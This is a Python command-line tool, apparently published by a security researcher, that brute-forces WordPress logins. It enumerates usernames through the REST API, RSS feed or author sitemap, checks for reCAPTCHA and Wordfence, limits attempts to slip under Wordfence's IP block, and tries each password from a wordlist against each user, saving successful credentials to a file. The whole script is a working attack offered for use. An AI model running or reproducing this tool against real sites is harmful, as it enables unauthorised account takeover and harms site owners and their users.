#!/usr/bin/env python
#
# Wordpress Bruteforce Tool
#
# By @random_robbie
# 
#

import requests
import json
import sys
import argparse
import re
import os.path
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True, default="http://wordpress.lan", help="Wordpress URL")
parser.add_argument("-f", "--file", required=True, default="pass.txt" ,help="Password File")
args = parser.parse_args()
url = args.url
passfile = args.file



http_proxy = ""
proxyDict = { 
              "http"  : http_proxy, 
              "https" : http_proxy, 
              "ftp"   : http_proxy
            }



# Grab Wordpress Users via Wordpress JSON api
def grab_users_api(url):
	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept":"*/*"}
	response = session.get(""+url+"/wp-json/wp/v2/users", headers=headers,verify=False, proxies=proxyDict)
	if 'rest_user_cannot_view' in response.text:
		print ("[-] REST API Endpoint Requires Permissions [-]")
		return False
	if response.status_code == 404:
		print ("[-] Rest API Endpoint returns 404 Not Found [-]")
		return False
	elif response.status_code == 200:
		jsonstr = json.loads(response.content)
		return jsonstr

            
# Grab Wordpress Users via Sitemap
def grab_users_sitemap(url):
	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept":"*/*"}
	response = session.get(""+url+"/author-sitemap.xml", headers=headers,verify=False, proxies=proxyDict)
	if response.status_code == 404:
		return False
	elif response.status_code == 200:
		return response.text

# Grab Wordpress Users via RSS Feed
def grab_users_rssfeed(url):
	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept":"*/*"}
	response = session.get(""+url+"/feed/", headers=headers,verify=False, proxies=proxyDict)
	if response.status_code == 404:
		return False
	elif response.status_code == 200:
		if "dc:creator" in response.text:
			return response.text
		

# Check we can get to wp-admin login.
def check_wpadmin(url):
	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept":"*/*"}
	response = session.get(""+url+"/wp-login.php?reauth=1&jetpack-sso-show-default-form=1", headers=headers,verify=False, proxies=proxyDict)
	if "Powered by WordPress" in response.text:
		if "wp-submit" in response.text:
			if "reCAPTCHA" not in response.text:
				return True
			else:
				return False
		else:
			return False
	else:
		return False


		
# Check URL is wordpress
def check_is_wp(url):
	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept":"*/*"}
	response = session.get(""+url+"", headers=headers,verify=False, proxies=proxyDict)
	if "wp-content" in response.text:
		return True
	else:
		return False	


# Check if wordfence is installed as this limits the logins to 20 per ip
def check_wordfence(url):
	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept":"*/*"}
	response = session.get(""+url+"/wp-content/plugins/wordfence/readme.txt", headers=headers,verify=False, proxies=proxyDict)
	if "Wordfence Security - Firewall & Malware Scan" in response.text:
		return True
	else:
		return False	
			
		
# Test the logins		
def test_login (url,user,password,cnt,attempts):
	if str(cnt) == attempts:
		print("[-] Stopping as Wordfence will block your IP [-]")
		sys.exit(0)
	paramsPost = {"wp-submit":"Log In","pwd":""+password+"","log":""+user+"","testcookie":"1","redirect_to":""+url+"/wp-admin/"}
	headers = {"Origin":""+url+"","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/x-www-form-urlencoded"}
	cookies = {"wordpress_test_cookie":"WP+Cookie+check"}
	response = session.post(""+url+"/wp-login.php?redirect_to="+url+"/wp-admin/", data=paramsPost, headers=headers, cookies=cookies,verify=False, proxies=proxyDict,allow_redirects = False)
	if response.status_code == 503:
		print("[-] Website is giving 503 HTTP Status [-]")
		sys.exit(0)
	if response.status_code == 502:
		print("[-] Website is giving 502 HTTP Status [-]")
		sys.exit(0)
	if response.status_code == 403:
		print("[-] Website is giving 403 HTTP Status  - WAF Blocking[-]")
		sys.exit(0)
	if "Google Authenticator code" in response.text:
		print("[-] 2FA is enabled Sorry [-]")
		sys.exit(0)
	if response.headers['Set-Cookie']:
		if "wordpress_logged_in" in response.headers['Set-Cookie']:
			print("[+] Found Login Username: "+user+" Password: "+password+" on attempt "+str(cnt)+" [+]")
			text_file = open("found.txt", "a")
			text_file.write(""+url+" Found Login Username: "+user+" Password: "+password+"\n")
			text_file.close()
			sys.exit(0)
	else:
		print("[-] Login Failed for Username: "+user+" Password: "+password+" on attempt "+str(cnt)+" [-]")
	cnt += 1
	return cnt
	
def count_pass(passfile):
	count = 0
	with open(passfile, 'r') as f:
		for line in f:
			count += 1
		f.close()
			
	return str(count)
	

# Dont no body  like dupes.
def remove_dupes():
	lines_seen = set()
	outfile = open("users.txt", "w")
	for line in open("rssusers.txt", "r"):
		if line not in lines_seen:
			outfile.write(line)
			lines_seen.add(line)
	outfile.close()




def attack_restapi(url,attempts,userdata,passfile):
	for id in userdata:
			user = id['slug']
			cnt = 1
			print(("[+] Found User: "+user+" [+]"))
			with open(passfile, 'r') as f:
				for line in f:
					password = line.strip()
					cnt = test_login (url,user,password,cnt,attempts)
			f.close()



def attack_rssfeed(url,attempts,userdata,passfile):
	users = re.compile("<dc:creator><!(.+?)]]></dc:creator").findall(userdata)
	if os.path.exists("rssusers.txt"):
		os.remove("rssusers.txt")
	if os.path.exists("users.txt"):
		os.remove("users.txt")
	for user in users:
		u = user.replace("[CDATA[","")
		text_file = open("rssusers.txt", "a")
		text_file.write(""+str(u)+"\n")
		text_file.close()
	remove_dupes()
	with open("users.txt", 'r') as f:
		for line in f:
			user = line.strip()
			cnt = 1
			print(("[+] Found User: "+user+" [+]"))
			with open(passfile, 'r') as b:
				for line in b:
					password = line.strip()
					cnt = test_login (url,user,password,cnt,attempts)
			f.close()
			b.close()
					
	
	
	
	
def attack_sitemap(url,attempts,userdata,passfile):
	auth = re.findall(r'(<loc>(.*?)</loc>)\s',userdata)
	for user in auth:
		thisuser = user[1]
		h = thisuser.split('/')
		user = h[4]
		cnt = 1
		with open(passfile, 'r') as f:
				for line in f:
					password = line.strip()
					cnt = test_login (url,user,password,cnt,attempts)
		f.close()
		
		
# Time For Some Machine Learning Quality IF statements.		
def basic_checks(url):
	if check_is_wp(url):
		if check_wpadmin(url):
			return True
		else:
			return False
	else:
		return False



		
if basic_checks(url):
	print("[+] Confirmed Wordpress Website [+]")
else:
	print ("[-] Sorry this is either not a wordpress website or there is a issue blocking wp-admin [-]")
	sys.exit(0)

if os.path.isfile(passfile) and os.access(passfile, os.R_OK):
    print("[+] Password List Used: "+passfile+" [+]")
else:
    print("[-] Either the file is missing or not readable [-]")
    sys.exit(0)
	
# Method Value for which method to enumerate users from	
method = "None"
attempts = "None"

# Which method to use for enumeration
if grab_users_api(url):
	print("[+] Users found via Rest API [-]")
	method = "restapi"

if grab_users_rssfeed(url) and method == "None":
	print("[+] Users found via RSS Feed [+]")
	method = "rss"

if grab_users_sitemap(url) and method == "None":
	print("[+] Users found via Authors Sitemap [-]")
	method = "sitemap"

if method == "None":
	print ("[-] Oh Shit it seems I was unable to find a method to grab usernames from [-]")
	sys.exit(0)	

if check_wordfence(url):
	print ("[+] Wordfence is installed this will limit the testing to 20 attempts  [+]")
	attempts = "20"



# Kick off Parsing and attacking
if method == "restapi":
	userdata = grab_users_api(url)
	attack_restapi(url,attempts,userdata,passfile)
if method == "rss":
	userdata = grab_users_rssfeed(url)
	attack_rssfeed(url,attempts,userdata,passfile)
if method == "sitemap":
	userdata = grab_users_sitemap(url)
	attack_sitemap(url,attempts,userdata,passfile)
